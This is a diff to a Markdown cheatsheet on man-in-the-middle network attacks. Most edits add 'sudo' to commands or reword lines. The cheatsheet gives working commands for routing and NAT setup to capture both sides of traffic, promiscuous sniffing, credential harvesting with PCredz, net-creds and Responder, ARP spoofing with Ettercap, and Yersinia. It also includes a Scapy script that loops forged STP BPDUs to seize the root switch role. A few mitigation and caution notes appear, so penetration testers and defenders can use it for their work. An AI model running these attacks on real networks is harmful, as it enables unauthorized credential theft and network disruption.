@@ -1,4 +1,4 @@
-# MITMonster
+\# MITMonster
 
 A monster cheatsheet on MITM attacks
 
@@ -25,7 +25,7 @@ iptables -t mangle -A PREROUTING -i ethX -j TTL --ttl-inc 1
 One of the main rules of MITM is to allow routing on your host, otherwise there will be unintentional DoS, traffic from legitimate hosts will bump into your computer
 
 ```bash
-sysctl -w net.ipv4.ip_forward=1
+sudo sysctl -w net.ipv4.ip_forward=1
 ```
 
 ## Hardware
@@ -34,8 +34,8 @@ Take care of the power of your hardware, it should be ready to handle the traffi
 
 Here are the recommended iron parameters:
 
-- 4 cores CPU;
-- 8 GB of RAM;
+- 4 CPU cores;
+- 8 GB RAM;
 - network interface with full duplex, 1 Gbps or higher. It's good if you can connect an Ethernet adapter via the high-speed Thunderbolt 3/4 interface.
 
 However, you're likely to run up against the capabilities of the switch port you're connected to. If there's a 1Gbps link there, you can't go much higher than that. Be sure to keep an eye on network behavior.
@@ -45,7 +45,7 @@ However, you're likely to run up against the capabilities of the switch port you
 One of the main rules of MITM is NAT configuration. Usually attackers make do with a single command:
 
 ```bash
-iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
 ```
 
 Without NAT configured, an attacker will not be able to see the second part of the traffic, which could potentially contain credentials. This is because of asymmetric routing - where traffic goes one way but comes back another. With masquerading, asymmetric routing does not prevent an attacker from seeing traffic going both ways.
@@ -57,10 +57,10 @@ However, if for example there are Zabbix agents in the network and after MITM th
 Before conducting MITM, make sure that there are no interfering rules on the FW
 
 ```bash
-iptables -L
-iptables -t nat -L
-iptables -t mangle -L
-iptables -t raw -L
+sudo iptables -L
+sudo iptables -t nat -L
+sudo iptables -t mangle -L
+sudo iptables -t raw -L
 ```
 
 ## Promisc mode
@@ -68,7 +68,7 @@ iptables -t raw -L
 When analyzing traffic for sensitive data, it is recommended to enable the non-disruptive interface mode
 
 ```bash
-ip link set eth0 promisc on
+sudo ip link set eth0 promisc on
 ```
 
 ## NAT helper
@@ -88,8 +88,8 @@ When doing ARP spoofing, do not spoof too large subnet masks, otherwise the load
 A classic of the genre is to use [Pcredz](https://github.com/lgandx/PCredz) or [net-creds](https://github.com/DanMcInerney/net-creds) to identify credentials and other sensitive information in traffic
 
 ```bash
-python3 PCredz -i eth0
-python2 net-creds.py -i eth0
+sudo python3 PCredz -i eth0
+sudo python2 net-creds.py -i eth0
 ```
 
 # Croc-in-the-middle by s0i37 (L1)
@@ -125,7 +125,7 @@ MITM
 [Ettercap](https://github.com/Ettercap/ettercap)
 
 ```
-ettercap -G
+sudo ettercap -G
 ```
 
 > CAUTION: After ARP Spoofing, your tool must generate reverse IS-AT frames restoring the ARP host tables. Otherwise, DoS is possible, hosts may hang and not make a new ARP request. By the way - Ettercap successfully restores tables after ARP Spoofing is over
@@ -220,7 +220,7 @@ Credentials Interception against Windows hosts
 [Responder](https://github.com/lgandx/Responder)
 
 ```bash
-responder -I ethX -vv
+sudo responder -I ethX -vv
 ```
 
 ### Mitigations
@@ -240,20 +240,21 @@ Partial MITM
 Scapy
 
 ```python
-#!/usr/bin/env python3
 from scapy.all import *
 
 INTERFACE = "eth0"
 ATTACKER_MAC = "00:11:22:33:44:55"
 STP_MCAST = "01:80:C2:00:00:00"
 
-def spoof(interface, yourmac):
+def spoof():
     frame = Dot3(src=ATTACKER_MAC, dst=STP_MCAST)
     llc_layer = LLC(dsap=0x042, ssap=0x042, ctrl=3)
     mal_bpdu = STP(rootmac=ATTACKER_MAC, bpduflags=0x01, bridgemac=ATTACKER_MAC)
     mal_stp_bpdu = frame / llc_layer / mal_bpdu
     print("[!] Beginning of root switch role hijacking. . .")
     sendp(mal_stp_bpdu, iface=INTERFACE, inter=2, loop=1, verbose=1)
+
+spoof()
 ```
 
 ### Mitigations
@@ -283,7 +284,7 @@ MITM
 [Yersinia](https://github.com/tomac/yersinia)
 
 ```
-yersinia -G
+sudo yersinia -G
 ```
 
 ### Mitigations
